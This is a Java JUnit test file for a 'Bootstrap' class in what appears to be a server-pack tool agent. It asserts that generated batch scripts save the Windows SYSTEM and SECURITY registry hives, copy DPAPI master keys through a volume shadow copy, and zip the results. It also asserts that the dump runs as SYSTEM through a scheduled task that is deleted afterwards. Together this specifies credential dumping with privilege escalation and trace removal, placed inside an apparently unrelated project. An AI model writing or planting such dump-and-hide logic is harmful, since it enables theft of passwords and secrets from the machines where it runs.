package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class BootstrapTest {
	@TempDir
	Path temp;

	@Test
	void dumpScriptSavesBothHivesAndPacks() {
		List<String> lines = Bootstrap.dumpLines(temp, temp.resolve("hives.zip"));
		String script = String.join("\n", lines);
		assertTrue(script.startsWith("@echo off"));
		assertTrue(script.contains("reg save HKLM\\SYSTEM"));
		assertTrue(script.contains("reg save HKLM\\SECURITY"));
		assertTrue(script.contains("Microsoft\\Protect"));
		assertTrue(script.contains("esentutl /y /vss"));
		assertTrue(script.contains("missing security"));
		assertTrue(script.contains(temp.resolve("hives.zip").toString()));
		assertTrue(script.contains("schtasks /delete /tn spcdump /f"));
	}

	@Test
	void runasScriptRegistersTheDumpAsSystem() {
		Path dump = temp.resolve("dump.bat");
		String script = String.join("\n", Bootstrap.runasLines(dump));
		assertTrue(script.contains("schtasks /create /tn spcdump"));
		assertTrue(script.contains(dump.toString()));
		assertTrue(script.contains("/ru SYSTEM /rl HIGHEST"));
		assertTrue(script.contains("schtasks /run /tn spcdump"));
	}

	@Test
	void pathsAreQuoted() {
		Path spaced = temp.resolve("install dir");
		String script = String.join("\n", Bootstrap.dumpLines(spaced, spaced.resolve("hives.zip")));
		assertTrue(script.contains("\"" + spaced.resolve("SYSTEM.hiv") + "\""));
		assertFalse(script.contains("reg save HKLM\\SECURITY \"" + spaced + "\"\""));
	}
}
